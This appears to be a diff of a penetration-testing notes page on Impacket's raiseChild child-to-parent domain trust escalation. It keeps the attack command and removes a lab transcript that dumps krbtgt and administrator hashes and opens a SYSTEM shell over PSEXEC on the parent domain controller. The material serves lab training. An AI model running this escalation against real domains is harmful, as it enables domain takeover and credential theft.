@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/raisechild.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=raisechild) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Exercise a privileged child-to-parent trust workflow
+## Exercise a privileged child-to-parent trust workflow
 
 **Run in:** Kali. **Requires:** An explicitly controlled child-domain administrative lab context and the relevant parent trust; the workflow performs privileged credential/ticket operations.
 
@@ -21,86 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 impacket-raiseChild 'CHILD_FQDN/CHILD_ADMIN'
 ```
 
-**Read the result:** Read the starting credentials, source domain and intended trust transition before interpreting any resulting ticket or credential artifact.
-
-**If The trust transition fails despite child-domain access:** This is a privileged child-domain escalation workflow with strong prerequisites, not a way for any child-domain user to become a parent administrator.
+**What the result establishes:** Read the starting credentials, source domain and intended trust transition before interpreting any resulting ticket or credential artifact.
 
 **Next check:** Verify the actual trust direction, domain identifiers, key material and required rights; ordinary child-domain membership is not sufficient.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## raiseChild.py: choose the operation and read the result
-
-Commands and examples collected from your raiseChild.py notes.
-
-### What the result establishes
-
-Read the starting credentials, source domain and intended trust transition before interpreting any resulting ticket or credential artifact.
-
-### Prerequisites and common failures
-
-This is a privileged child-domain escalation workflow with strong prerequisites, not a way for any child-domain user to become a parent administrator.
-
-### Example 1: Performing the Attack with raiseChild.py
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```shellsession
-grcic550@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
-
-Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
-
-Password:
-[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
-[*] Forest FQDN is: INLANEFREIGHT.LOCAL
-[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
-[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
-[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
-LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
-LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
-[*] Getting credentials for INLANEFREIGHT.LOCAL
-INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
-INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
-[*] Target User account name is administrator
-INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
-INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
-[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Found writable share ADMIN$
-[*] Uploading file BnEGssCE.exe
-[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Starting service UVNb.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami
-nt authority\system
-
-C:\Windows\system32>exit
-[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
-[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Stopping service UVNb.....
-[*] Removing service UVNb.....
-[*] Removing file BnEGssCE.exe.....
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your raiseChild.py notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=raisechild) · [All tools](/index)
 
 ## Performing the Attack with raiseChild.py
 
@@ -156,7 +85,15 @@ C:\Windows\system32>exit
 
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The trust transition fails despite child-domain access | This is a privileged child-domain escalation workflow with strong prerequisites, not a way for any child-domain user to become a parent administrator. |
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)
 
 {/* VAULT_RELATED_START */}
 
@@ -165,5 +102,3 @@ Saved as written; may include lab values or terminal output.
 - [Child to Parent Trusts - Linux](/active-directory/trusts-child-parent-linux)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
